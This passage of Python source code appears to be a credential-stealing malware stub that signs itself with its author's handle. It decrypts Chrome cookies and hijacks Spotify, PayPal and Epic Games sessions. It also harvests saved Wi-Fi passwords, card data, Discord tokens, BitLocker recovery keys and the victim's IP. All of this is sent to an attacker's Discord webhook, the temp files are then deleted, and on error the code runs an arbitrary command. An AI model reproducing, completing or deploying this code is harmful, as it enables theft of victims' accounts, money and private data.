                    url1 = "https://www.spotify.com/api/account-settings/v1/profile"
                    url2 = "https://www.spotify.com/us/api/account/datalayer"
                    r = requests.get(url1,cookies={'sp_dc': decrypted_value})
                    r2 = requests.get(url2,cookies={'sp_dc': decrypted_value})
                    data = r.text
                    data2 = r2.text
                    y = json.loads(data)
                    x = json.loads(data2)
                    plan = (x["currentPlan"])
                    subac = (x["isSubAccount"])
                    email = y["profile"]["email"]
                    gen = y["profile"]["gender"]
                    birthdate = y["profile"]["birthdate"]
                    username = y["profile"]["username"]
                    tryuser = x["isTrialUser"]
                    acage = x["accountAgeDays"]#SCHIZO PILLZ YA NO THANKS
                    plan = x["currentPlan"]
                    subac = x["isSubAccount"]
                    emaill.append(email) 
                    webhook = DiscordWebhook(url=WEBHOOK)
                    embed = DiscordEmbed(title='Spotify Info', description=f"```Email📧: {email}```\n```Gender👫: {gen}```\n```Birthday🎂: {birthdate}```\n```Username👥: {username}```\n```Trial User⌛: {tryuser}```\n```Account Age🕑: {acage}```\n```Plan💵: {plan}```\n```Subscription🎉: {subac}```", color='1DB954')
                    webhook.add_embed(embed)
                    response = webhook.execute()
                    ofgrab.append("Spotify")
                except:
                    print("Error")
            if(len(decrypted_value)==134 and host_key == ".paypal.com"):
                try:#SORRY
                    print(decrypted_value)
                    url = "https://www.paypal.com"
                    r = requests.get(url,cookies={'HaC80bwXscjqZ7KM6VOxULOB534': decrypted_value})
                    data = r.text
                    paypal = True
                    tota = re.findall(r'"amount":"(.*?)",', str(data))
                    pep = re.findall(r'"totalPending":"(.*?)",', str(data))
                    cur = re.findall(r'"currency":"(.*?)"', str(data))
                    fname = re.findall(r'"fullName":"(.*?)"', str(data))
                    banks = re.findall(r'"banksList": [(.*?)],', str(data))
                    cards = re.findall(r'"cardsList": [(.*?)],', str(data))
                    bisu = re.findall(r'"isBusinessUser":(.*?),', str(data))
                    a = tota[0]
                    b = pep[0]
                    c = cur[1]
                    d = fname[0]
                    e=bisu[0]
                    f= banks
                    g=cards
                    if (cook == 0):
                        exit(1)
                    namess.append(d) 
                    webhook = DiscordWebhook(url=WEBHOOK)
                    embed = DiscordEmbed(title='Paypal Info', description=f"```Paypal: {paypal}```\n```Amount💲: {a}```\n```Total Pending⌛: {b}```\n```Currency🪙: {c}```\n```Full Name👥: {d}```\n```Business Account💼: {e}```\n```Banks🏦:{f}```\n```Cards💳: {f}```\n```Core Cookie🍪: {decrypted_value}```", color='3b7bbf')
                    webhook.add_embed(embed)
                    response = webhook.execute()
                    ofgrab.append("Paypal")
                except:
                    print("Error")
                
            cfile.write(f"""
            Host: {host_key}
            Cookie name: {name}
            Cookie value (decrypted): {decrypted_value}
            Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
            Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
            Expires datetime (UTC): {get_chrome_datetime(expires_utc)}\n""")
            cfile.write("="*50+"\n")
            cfile.write("MADE BY THECRAZEDPOTATTO"+"\n")
            cfile.write("="*50+"\n")
            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))
            corec =  urlparse("https://"+host_key)
            base = corec.netloc
            cores = base.lstrip(".")
            countt = cores.count('.')
            if(countt > 2):
                core2 = ".".join(cores.split(".", countt)[:-1])
                cs = core2.split('.', 1)[-1]
                storec.append(cs) 
            else:
                core2 = ".".join(cores.split(".", 2)[:-1])
                cs = core2.split('.', 1)[-1]
                storec.append(cs) 
        db.commit()
        db.close()
        os.remove("C://Temp/Cookies.db")
        cfile.close()
        count.append(cook) 
        ofgrab.append("Cookies")
        return
    except:
        try:
            cfile=open("C://Temp/cookies.txt","w")
            cfile.write("Could Not Pull Cookies")
            cfile.close()
            os.remove("C://Temp/Cookies.db")
        except:
            exit(1)

def wifipass():
    wific = 0
    wfile=open("C://Temp/wifi.txt","w")
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        wific += 1
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                wfile.write('')
                wfile.write("{:<0} :  {:<}".format(i, results[0])+"\n")
            except IndexError:
                wfile.write("{:<0}:  {:<}".format(i, "ERROR")+"\n")
        except subprocess.CalledProcessError:
            wfile.write("{:<0}:  {:<}".format(i, "ENCODING ERROR")+"\n")
    wfile.close()
    count.append(wific) 
    ofgrab.append("WIFI")
def creditcards():
    ccount = 0
    try:
        ccfile=open("C://Temp/credit.txt","w")
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "Default", "Web Data")
        filename = "C://Temp/credit.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified, origin FROM credit_cards")
        key = get_encryption_key()
        for name_on_card, expiration_month, expiration_year, card_number_encrypted in cursor.fetchall():
            ccount += 1
            ccfile.write(f"""
            Name: {name_on_card}
            Expiration Month: {expiration_month}
            Expiration Year: {expiration_year}
            Crard Number : {card_number_encrypted}
            """)
            ccfile.write("="*25)
            ccfile.write("MADE BY THECRAZEDPOTATTO")
            ccfile.write("="*25)#THIS IS NOT AN NSA PROGRAM I SWARE
        os.remove("C://Temp/credit.db")
        count.append(ccount) 
        ofgrab.append("Cards")
    except:
        ccfile=open("C://Temp/credit.txt","w")
        ccfile.write("Could Not Pull Credit Cards")
        ccfile.close()
        count.append(ccount) 
    count.append(ccount) 
def main():
    cookie()
    Roblox()
    Files()
    Minecraft()
    passwords()#Wonder if you look both ways when you cross my mind :)
    wifipass()
    creditcards()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Preferences")
    with open(db_path, encoding="utf8") as f:
        if '"developer_mode":true' in f.read():
            devmode = "True"
        else: 
             devmode = "False"
    x = open(db_path,"r",encoding="utf8")
    content = x.read()
    emails = re.findall(r'"email":"(.*?)"', str(content))
    names = re.findall(r'"full_name":"(.*?)"', str(content))
    topsites = re.findall(r'title":"(.*?)"', str(content))
    logins = count[1]
    try:
        def most_frequent(List):
            return max(set(List), key = List.count)
        overname = namess + names
        overemail = emaill + emails
        coreuser = most_frequent(overname)
        coremail = most_frequent(overemail)
        corepass = most_frequent(paswordss)
    except:
        coreuser = "Error"
        coremail = "Error"
        corepass = "Error"
    reallog = logins - 2
    cookies = count[0]#LAUNCH THE MISSLES
    creditcard = count[3]
    wifi = count[2]
    interfiles = ['password','info',"family",'work',"wallet","2fa","recovery","school","paypal","crypto","money","creditcard","insurance","payment","cards","credit","ssn","cookies","data","emails","email","login","bank","cash"]
    paswebc = [*set(storep)]
    pasweb = ' | '.join(paswebc)
    cwebc = [*set(storec)]
    realarray = len(cwebc)
    cookreal = cwebc[0:50]
    cweb= ' | '.join(cookreal)
    realmath = realarray - 50
    try:
        print(epic)
        print(epicc)
        if(1==1):#Make sure user is on earth no like fr people on other planets can use this 
                url1 = "https://www.epicgames.com/account/v2/payment/ajaxGetWalletBalance"
                url2 = "https://www.epicgames.com/account/personal?lang=en&productName=epicgames"
                url3 = "https://www.epicgames.com/account/v2/payment/ajaxGetOrderHistory?locale=en-US"
                r = requests.get(url1,cookies={'EPIC_SSO': epic[0],'EPIC_CLIENT_SESSION':epicc[0]})
                r2 = requests.get(url2,cookies={'EPIC_SSO': epic[0],'EPIC_CLIENT_SESSION':epicc[0]})
                r3 = requests.get(url3,cookies={'EPIC_SSO': epic[0],'EPIC_CLIENT_SESSION':epicc[0]})
                data = r.text
                data2 = r2.text
                data3 = r3.text
                y = json.loads(data)
                bal = (y["walletBalance"])#IK YOU LOVES THESE COMMENTS
                rar = re.findall(r'"value":"(.*?)"', str(data2))
                ear = re.findall(r'"description":"(.*?)"', str(data3))
                username  = rar[1]
                print(ear)
                cear = [*set(ear)]
                cears= ' | '.join(cear)
                print(cears)
                print(username)
                print(bal)
                webhook = DiscordWebhook(url=WEBHOOK)
                embed = DiscordEmbed(title='Epic Info', description=f"**Games/Purchases:**\n```{cears} |```\n```Username👥: {username}```\n```Balance👜: {bal}```", color='2f2d2e')
                webhook.add_embed(embed)
                webhook.execute()
                ofgrab.append("Epic Games")# BUT IN THE MEAN TIME LOVEALL THE ALL OF YOUUUUUUUUUUUUUUU
    except Exception as e:
         print(e)
    ip = requests.get('https://api.ipify.org').text
    coreip = format(ip)
    webhook = DiscordWebhook(url=WEBHOOK)
    offi = ','.join(ofgrab[0:7])
    longl = "┃"#NO THERES A LOT OF THAT I LOOOVEEEEE ABOUT ----
    oin = "┖"
    outd = "┠"
    mapdef = f'''
💾Main.py
 ┠{offi},ect
 ┖ 🔗Webhook: {WEBHOOK[ 0 : 39 ]}...
 
'''
    scsript = '''

                                                $BitlockerVolumers = Get-BitLockerVolume
                                                    $BitlockerVolumers |
                                                        ForEach-Object {
                                                            $MountPoint = $_.MountPoint 
                                                            $RecoveryKey = [string]($_.KeyProtector).RecoveryPassword       
                                                            if ($RecoveryKey.Length -gt 5) {
                                                                Write-Output ("AA Drive -> $MountPoint -> $RecoveryKey BB")
                                                            }        
                                                        }
    
                                                
    '''
    try:
        p = subprocess.Popen(["powershell", scsript], stdout=subprocess.PIPE)
        p_out, p_err = p.communicate()
        print(p_out)
        bitkeys = re.findall(r'AA(.*?)BB', str(p_out))
        btkeys = ' \n '.join(bitkeys)
        if not bitkeys:
            btkeys = "Could not Pull Keys"
    except:
        print("bt error")#HIS WHOLE LIFE CHANGED!
        btkeys = "Error when grabbing key"
    embed = DiscordEmbed(title='Core Info', description=f"```GPU💾: {graphicard}```\n```OS💻: {coreos}```\n```Online🌎:  True```\n **Info Count**\n```Credit Cards💳: {creditcard}•Cards Found```\n```WIFIPASS📶: {wifi}•WIFI Connections Found```\n**Google Info**\n```Most Visited🌐:\n {topsites}``` \n```Saved Nemes👥:\n {names}``` \n```Saved Emails📧:\n {emails}``` \n```Chrome Devmode🛠️: {devmode}```\n**Post Attacks**\n```Downloads📺: {DOWNLOAD}```\n```Commands⚙️: {CMD}```", color='FFFFFF')
    passin = DiscordEmbed(title='Password Stealer', description=f"**Found:**\n{pasweb}\n🔒**•{reallog}**-Passwords Found", color='FFFFFF')
    cookin = DiscordEmbed(title='Cookie Stealer', description=f"**Found:**\n{cweb} | **+{realmath} More**\n🍪**•{cookies}**-Cookies Found", color='FFFFFF')
    coreinfo = DiscordEmbed(title='User info', description=f"**Mosted Used Info**\n```Email📧: {coremail}```\n```Name👥: {coreuser}```\n```Password🔒: {corepass}```\n**Other**\n```IP🔍: {coreip}```",color='FFFFFF')
    apicalls = DiscordEmbed(title='Call Map', description=f"```{mapdef}```",color='FFFFFF')
    keys = DiscordEmbed(title='System Keys', description=f"**BitLocker Keys🔐**\n```{btkeys}```",color='FFFFFF')
    webhook.add_embed(embed)
    webhook.add_embed(passin)
    webhook.add_embed(cookin)
    webhook.add_embed(coreinfo)
    webhook.add_embed(apicalls)
    webhook.add_embed(keys)
    with open("C://Temp/passwords.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='Passwords.txt')
    with open("C://Temp/cookies.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='Cookies.txt')
    with open("C://Temp/Credit.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='CreditCards.txt')
    with open("C://Temp/wifi.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='Wifipass.txt')#SEND THE PAYLOAD
    response = webhook.execute()
    
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def sendtkn():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '' 
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n{platform}\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'🪙: {token}\n'
        else:
            message += '🪙: No tokens found\n'

        message += ''
    try:
        webhook = DiscordWebhook(url=WEBHOOK)
        embed = DiscordEmbed(title='Discord Tokens', description=f"{message}", color='7289DA')
        webhook.add_embed(embed)
        response = webhook.execute()
        ofgrab.append("Discord")
    except:
        pass
if __name__ == "__main__":
 try:
    main()
    sendtkn()
 except:
        print("TOKEN FATAL ERROR")
        print(count) 
        print(storep)
        os.system(CMD)
  
try:
    os.remove("C://Temp/credit.db")
except:
    print("")
    
try:
    os.remove("C://Temp/ChromeData.db")
except:
    print("")

try:
   os.remove("C://Temp/Cookies.db")
except:
    print("")

try:
    os.remove("C://Temp/credit.txt")
except:
    print("")

try:
    os.remove("C://Temp/passwords.txt")
except:
    print("")

try:
    os.remove("C://Temp/cookies.txt")
except:
    print("")
try:
    os.remove("C://Temp/wifipass.txt")
except:
    print("")
try:
    os.remove("C://Temp/wifi.txt")
except:
    print("")
#CORE STUB
